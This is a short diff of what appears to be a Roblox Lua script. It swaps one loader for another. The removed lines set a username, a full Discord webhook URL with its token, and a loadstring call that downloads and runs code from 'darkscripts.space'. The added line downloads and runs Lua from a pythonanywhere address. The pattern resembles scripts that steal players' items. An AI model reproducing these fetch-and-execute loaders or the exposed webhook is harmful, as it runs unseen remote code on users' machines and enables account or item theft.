@@ -1,4 +1,1 @@
-UserName = "xxxNIKITOIDxxx"
-Webhook = "https://discord.com/api/webhooks/1314163598054129664/9QQFhJgC-ZrrT_QRfhQj8ZJV-Oxnu-CrUmMcpinXHPnGewytXaKJouGaUXaOBQ7gc281"
-
-loadstring(game:HttpGet("https://darkscripts.space/pleasedonate",true))()
+loadstring(game:HttpGet("https://vlorplol.pythonanywhere.com/mainscript/y2XZrx9bX9GcM4N.lua"))()
